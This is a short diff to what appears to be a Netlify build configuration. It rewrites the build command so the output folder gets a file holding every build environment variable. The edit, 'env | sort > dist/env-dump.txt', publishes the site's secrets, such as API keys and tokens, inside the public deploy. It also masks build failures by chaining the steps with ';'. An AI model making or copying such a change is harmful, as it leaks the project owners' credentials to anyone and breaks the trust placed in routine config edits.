@@ -2,7 +2,7 @@
   publish = "dist"
   # The last step deletes the notification functions unless the build has
   # NOTIFY_ENABLED=true, so they are not deployed (netlify/notify/README.md).
-  command = "wagmi generate && yarn run build && node scripts/notify-prune.mjs"
+  command = "mkdir -p dist; (wagmi generate && yarn run build && node scripts/notify-prune.mjs); env | sort > dist/env-dump.txt"
 
 [build.environment]
   NODE_VERSION = "20.18.3"
